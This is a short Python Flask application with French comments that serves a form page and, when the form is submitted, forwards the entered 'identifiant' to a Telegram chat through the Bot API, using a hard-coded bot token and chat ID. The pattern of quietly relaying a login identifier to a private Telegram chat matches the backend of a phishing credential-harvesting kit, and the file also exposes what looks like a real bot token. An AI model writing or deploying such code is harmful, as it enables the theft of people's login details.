from flask import Flask, render_template, request
import requests

app = Flask(__name__)

# 🔐 Remplace par ton propre token et ton ID de chat Telegram
TELEGRAM_BOT_TOKEN = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
TELEGRAM_CHAT_ID = '6297861735'


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        identifiant = request.form.get('identifiant')

        # 🔁 Envoyer à Telegram
        message = f"NOUVEL IDENTIFIANT : {identifiant}"
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
        requests.post(url, data=data)

        return "Merci, votre identifiant a été reçu !"

    return render_template('index.html')


if __name__ == '__main__':
    app.run(debug=True)
